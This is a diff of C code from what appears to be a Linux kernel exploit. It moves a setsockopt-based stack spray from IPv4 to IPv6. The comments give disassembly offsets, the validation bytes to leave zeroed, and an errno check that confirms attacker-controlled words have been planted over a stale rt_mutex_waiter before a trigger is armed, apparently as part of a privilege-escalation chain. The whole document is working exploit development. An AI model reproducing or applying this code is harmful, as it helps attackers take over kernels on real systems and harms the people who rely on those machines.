@@ -454,6 +454,9 @@ void slide_pselect_stack_copy(void) {
 }
 
 #if defined(SLIDE_USE_SETSO_SPRAY) && SLIDE_USE_SETSO_SPRAY
+#ifndef SLIDE_SETSO_SPRAY_FAMILY
+#define SLIDE_SETSO_SPRAY_FAMILY AF_INET6
+#endif
 void slide_setsockopt_stack_copy(void) {
   if (!page_base || !fake_lock || !fake_w0) {
     pr_error("slide setsockopt missing kernel page base=%016zx lock=%016zx "
@@ -463,14 +466,15 @@ void slide_setsockopt_stack_copy(void) {
   }
 
   /*
-   * ip_setsockopt() optname SLIDE_SETSO_SPRAY_OPTNAME zeroes a
-   * SLIDE_SETSO_SPRAY_COPY_LEN-byte stack buffer at T-0x4f8 and copies it
-   * from user without any capability check.  The stale on-stack
-   * rt_mutex_waiter sits at T-0x4b8 = buffer + SLIDE_SETSO_SPRAY_WAITER_OFF,
-   * so the same words the pselect route would plant land exactly on it.  The
-   * handler then fails validation (buffer[0x20] != 2, we leave it zeroed) and
-   * returns -EADDRNOTAVAIL (-99, verified in the kernel disassembly at
-   * ip_setsockopt+0x910); the planted words persist on the popped stack.  We
+   * do_ipv6_setsockopt() optname SLIDE_SETSO_SPRAY_OPTNAME on an
+   * AF_INET6 SOCK_DGRAM socket (level IPPROTO_IPV6) zeroes a
+   * SLIDE_SETSO_SPRAY_COPY_LEN-byte stack buffer at sp+0x40 and copies it
+   * from user without any capability check (disasm +0x130).  The stale
+   * on-stack rt_mutex_waiter sits at T-0x4b8 = buffer +
+   * SLIDE_SETSO_SPRAY_WAITER_OFF, so the same words the pselect route would
+   * plant land exactly on it.  The handler then fails validation
+   * (buffer[0x8] != 0xa and buffer[0x88] != 0xa, disasm +0xce8) and returns
+   * -EADDRNOTAVAIL (-99); the planted words persist on the popped stack.  We
    * only arm the consumer trigger after observing that errno, so a
    * policy-denied spray (EACCES/EPERM) never lets the PI walk hit garbage.
    */
@@ -487,7 +491,7 @@ void slide_setsockopt_stack_copy(void) {
     memcpy(buf + off, &slide_waiter_words[i].value, 8);
   }
 
-  int fd = (int)syscall(SYS_socket, AF_INET, SOCK_DGRAM, 0);
+  int fd = (int)syscall(SYS_socket, SLIDE_SETSO_SPRAY_FAMILY, SOCK_DGRAM, 0);
   if (fd < 0) {
     pr_error("slide setsockopt socket errno=%d\n", errno);
     return;
@@ -514,9 +518,10 @@ void slide_setsockopt_stack_copy(void) {
   int saved_errno = errno;
   /*
    * The 0x108-byte copy runs before validation, then the handler checks
-   * buffer[0x20] == 2 (and buffer[0xa0] == 2) and returns -EADDRNOTAVAIL on
-   * mismatch - which is exactly what we want: words planted, option rejected.
-   * Treat EADDRNOTAVAIL (and EINVAL for older kernels) as "copy accepted".
+   * buffer[0x8] == 0xa (and buffer[0x88] == 0xa) and returns -EADDRNOTAVAIL
+   * on mismatch - which is exactly what we want: words planted, option
+   * rejected.  Treat EADDRNOTAVAIL (and EINVAL for older kernels) as "copy
+   * accepted".
    */
   if (ret != -1 || (saved_errno != EADDRNOTAVAIL && saved_errno != EINVAL)) {
     pr_error("slide setsockopt spray not accepted ret=%d errno=%d; "
